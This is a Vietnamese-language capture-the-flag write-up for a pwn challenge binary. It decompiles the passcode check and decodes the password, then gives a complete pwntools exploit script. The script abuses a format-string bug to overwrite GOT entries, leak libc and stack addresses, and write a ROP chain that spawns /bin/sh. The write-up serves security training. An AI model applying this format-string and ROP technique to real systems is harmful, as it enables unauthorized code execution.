##vault
___
### Thông tin:

Thông tin file: `chal`
```c
┌──(kali㉿kali)-[~/training_PWN/vault_of_lost_memories/challenge]
└─$ checksec --file=chal  
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols  No     0               3               chal
```
* `Partial RELRO`: có thể overwrite GOT
* `No PIE`: địa chỉ trong binary là tĩnh

Code từ **Ghidra**:
```c
undefined4 main(void)
{
  int correct;
  undefined4 val;
  
  banner();
  signal(0xe,FUN_00401230);
  alarm(100);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  correct = game();
  if (correct == 0) {
    val = 0;
    vuln();
  }
  else {
    val = 0xffffffff;
    fwrite("password mismatch!\n",1,23,stderr);
  }
  return val;
}


int game(void)
{
  int true;
  byte *pbVar1;
  size_t len;
  ushort **data_type;
  long in_FS_OFFSET;
  uint i;
  undefined4 j;
  byte buffer [40];
  long canary;
  byte char;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  for (i = 0; i < 32; i = i + 4) {
    pbVar1 = buffer + i;
    pbVar1[0] = 0;
    pbVar1[1] = 0;
    pbVar1[2] = 0;
    pbVar1[3] = 0;
  }
  puts("Welcome to the digital vault of lost memories! ");
  puts("Enter the passcode to enter the lost memory world: ");
  printf(">>> ");
  fflush(stdout);
  fgets((char *)buffer,32,stdin);
  len = strlen((char *)buffer);
  buffer[len - 1] = 0;
  for (j = 0; buffer[j] != 0; j = j + 1) {
    char = buffer[j];
    data_type = __ctype_b_loc();
    if (((*data_type)[(char)char] & 0x100) == 0) {
      data_type = __ctype_b_loc();
      if (((*data_type)[(char)char] & 0x200) != 0) {
        true = DAT_00404094 + (char)char + -0x61;
        buffer[j] = (char)true + (char)(true / 0x1a) * -0x1a + 0x61;
      }
    }
    else {
      true = DAT_00404094 + (char)char + -0x41;
      buffer[j] = (char)true + (char)(true / 0x1a) * -0x1a + 0x41;
    }
    buffer[j] = (byte)DAT_00404090 ^ buffer[j];
  }
  true = memcmp("cLVQjFMjcFDGQ",buffer,0xd);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return -(uint)(true != 0);
}


void vuln(void)
{
  long in_FS_OFFSET;
  char buffer [136];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  memset(buffer,0,128);
  puts("How should we address you? ");
  printf(">>> ");
  fgets(buffer,128,stdin);
  printf("hello ");
  printf(buffer);
  printf("Here are the lost memories:");
  putc(10,stdout);
  system("ls *.pdf");
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
Code từ **IDA**: 
````c
__int64 game()
{
  char char_1; // [rsp+7h] [rbp-39h]
  unsigned int i; // [rsp+8h] [rbp-38h]
  int j; // [rsp+Ch] [rbp-34h]
  char buffer[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 canary; // [rsp+38h] [rbp-8h]

  canary = __readfsqword(0x28u);

  for ( i = 0; i <= 31; i += 4 )
    *(_DWORD *)&buffer[i] = 0;

  puts("Welcome to the digital vault of lost memories! ");
  puts("Enter the passcode to enter the lost memory world: ");
  printf(">>> ");
  fflush(stdout);
  fgets(buffer, 32, stdin);
  buffer[strlen(buffer) - 1] = 0;
  for ( j = 0; buffer[j]; ++j )
  {
    char_1 = buffer[j];
    if ( ((*__ctype_b_loc())[char_1] & 0x100) != 0 )
    {
      buffer[j] = (char_1 - 65 + dword_404094) % 26 + 65;
    }
    else if ( ((*__ctype_b_loc())[char_1] & 0x200) != 0 )
    {
      buffer[j] = (char_1 - 97 + dword_404094) % 26 + 97;
    }
    buffer[j] ^= dword_404090;
  }
  return (unsigned int)-(memcmp("cLVQjFMjcFDGQ", buffer, 0xDuLL) != 0);
}

with dword_... following from the memory:
.data:0000000000404090 dword_404090    dd 35h                  ; DATA XREF: game+18D↑r
.data:0000000000404094 dword_404094    dd 0Ah 
````
____
Có bảng **ascii** để đối chiếu với chương trình encrypt trên:

<img width="873" height="578" alt="image" src="https://github.com/user-attachments/assets/0c61380c-e108-4439-9165-7af85f7028ab" />

Code `c` decrypt chương trình trên:
````c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main() {
	char password[] = "cLVQjFMjcFDGQ";
	int xor_key = 53;
	int mov_left = 10;

	printf("og pass: %s\n", password);
	for(int i=0;i<strlen(password);i++) {
		int c = (int)password[i];
		printf("char: %c, dec: %d\n", c, c);
		c = c ^ xor_key;
		if(c >= 'A' && c <= 'Z') {
			c = (c - 65 - mov_left + 26) % 26 + 65;
		} else if (c >= 'a' && c <= 'z') {
			c = (c - 97 - mov_left + 26) % 26 + 97;
		}
		password[i] = (char)c;
	}

	printf("\npassword: %s\n", password);
	return 0;
}
````
Chạy code `c` và ta được password gốc sau:

<img width="658" height="303" alt="image" src="https://github.com/user-attachments/assets/3a4a78e6-5c82-4ad7-baaa-3c2c8895f0c8" />
<img width="656" height="314" alt="image" src="https://github.com/user-attachments/assets/b8981381-03f9-4b88-bf3e-74c93fca604e" />

Chạy thử script.py với binary với password trên và leak thử:

`script.py`:
````python
from pwn import *

context.binary = exe = ELF("./chal", checksec=False)
context.log_level = "debug"

p = process(exe.path)

def GDB():
	gdb.attach(p, gdbscript='''
		br *0x4015a0
		br *0x4015e1
		br *0x4014dc
		br *0x401513
		''')
GDB()

p.sendlineafter(b">>> ", b"Lost_in_Light")

payload = b"%23$p %29$p"

p.sendlineafter(b">>> ", payload)

p.interactive()
````
Ta quan sát output từ chương trình:

<img width="655" height="441" alt="image" src="https://github.com/user-attachments/assets/925c3fdb-5712-46fc-b26f-c8bb76ac4ce6" />

<img width="657" height="316" alt="image" src="https://github.com/user-attachments/assets/d22e07dc-ee95-48ae-94ff-9de73185c5d7" />

___
### Bước khai thác:

Code của phần chương trình có lỗ hổng:
```c
void vuln(void)
{
  long in_FS_OFFSET;
  char buffer [136];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  memset(buffer,0,128);
  puts("How should we address you? ");
  printf(">>> ");
  fgets(buffer,128,stdin);
  printf("hello ");
  printf(buffer);
  printf("Here are the lost memories:");
  putc(10,stdout);
  system("ls *.pdf");
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
**Khai thác:**
- `fgets(buffer,128,stdin);`: đọc input với size bé hơn size buffer --> ~không có BOF~
- `printf(buffer);`: lỗ hổng **formatstring**; dùng `%p` để leak và `%n` để overwrite
- Vì file là `Partial RELRO`, ta có thể dùng formatstring write để overwrite một số chức năng theo ý của mình

**Ý tưởng:**
* B1: dùng `%n` overwrite GOT của system -> địa chỉ của `vuln()` (vì **NO PIE** nên địa chỉ vuln() cố định)
--> mỗi lần thực thi system() là chạy lại vuln() từ đầu
--> tạo được vòng loop trong vuln(), nhằm tái sử dụng formatstring

<img width="413" height="112" alt="image" src="https://github.com/user-attachments/assets/54341ce9-b30e-4ea5-a09c-adb230075b65" />

```python
vuln_addr = 0x401448
payload = fmtstr_payload(6, {exe.got['system']: vuln_addr})
```
* B2: dùng `%p` để leak thông tin như: địa chỉ stack, địa chỉ libc
--> bởi vì overwrite **system@got** thành từ đầu của **vuln()**, sẽ tạo một stack frame mới (push rbp; mov rbp, rsp; sub rsp, 0x90)

<img width="395" height="110" alt="image" src="https://github.com/user-attachments/assets/18be8763-aea4-40a3-867c-55adebe1b2bc" />
 
--> vì thế, phải căn offset `%{i}$p` để leak cho chuẩn
```python
payload = b"%p %49$p"
```
--> leak xong, tính toán ra địa chỉ: libc.address, rip
```python
rip = addr + 0x308
libc.address = leak_libc - 0x29ca8 
```
* B3: dùng `%n` overwrite RIP với ROP gadgets từ libc tính được

* B4: dùng `%n` overwrite lại **system@got** (hiện là địa chỉ **vuln()**) thành của `printf` của libc
--> `system("ls *.pdf")` sẽ thành `printf("ls *.pdf")`, in ra dòng string `"ls *.pdf"`
--> không làm cho system() bị corrupted, mà vẫn bypass được cái system()
--> `vuln()` đọc đến RIP và thực thi dòng ROP mà mình overwrite từ trước
--> được shell 

___
Final script:
```python
from pwn import *

context.arch = "amd64"
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

context.binary = exe = ELF("./chal", checksec=False)
context.log_level = "debug"

p = process(exe.path)

def GDB():
	gdb.attach(p, gdbscript='''
		handle SIGALRM ignore
		br *0x4014c8
		br *0x4014f0
		''')

GDB()

password = b"Lost_in_Light"

p.sendlineafter(b">>> ", password)

## 1 ######################
vuln_addr = 0x401448
# vuln_addr = 0x401453
payload = fmtstr_payload(6, {exe.got['system']: vuln_addr})

p.sendlineafter(b">>> ", payload)

## 2 ######################
# payload = b"%p %30$p"
payload = b"%p %49$p"
p.sendlineafter(b">>> ", payload)

p.recvuntil(b"hello ")
leak_data = p.recvline().strip().split()
addr = int(leak_data[0], 16)
leak_libc = int(leak_data[1], 16)
# rip = addr + 0x250
rip = addr + 0x308
libc.address = leak_libc - 0x29ca8 
print(f"[+] Data leaks and calculation: ")
print(f"addr: {hex(addr)}")
print(f"libc: {hex(leak_libc)}")
print(f"rip: {hex(rip)}")
print(f"libc_base: {hex(libc.address)}")

## 3 ######################
rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = 0x0000000000401016
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.symbols['system']

print(f"pop_rdi: {hex(pop_rdi)}")
print(f"ret: {hex(ret)}")
print(f"bin_sh: {hex(bin_sh)}")
print(f"system: {hex(system)}")

payload1 = {
    rip:     pop_rdi,
    rip + 8: bin_sh
}

payload2 = {
    rip + 16: ret,     
    rip + 24: system
}

payload = fmtstr_payload(6, payload1, write_size='short')
print(f"Payload-1 length: {len(payload)}")
p.sendlineafter(b">>> ", payload)

payload = fmtstr_payload(6, payload2, write_size='short')
print(f"Payload-2 length: {len(payload)}")
p.sendlineafter(b">>> ", payload)

## 4 ######################
print(f"[+] Changing system to printf: \n")
payload = fmtstr_payload(6, {exe.got['system']: libc.symbols['printf']})
print(f"- Payload length: {len(payload)}")
p.sendlineafter(b">>> ", payload)

p.interactive()
```
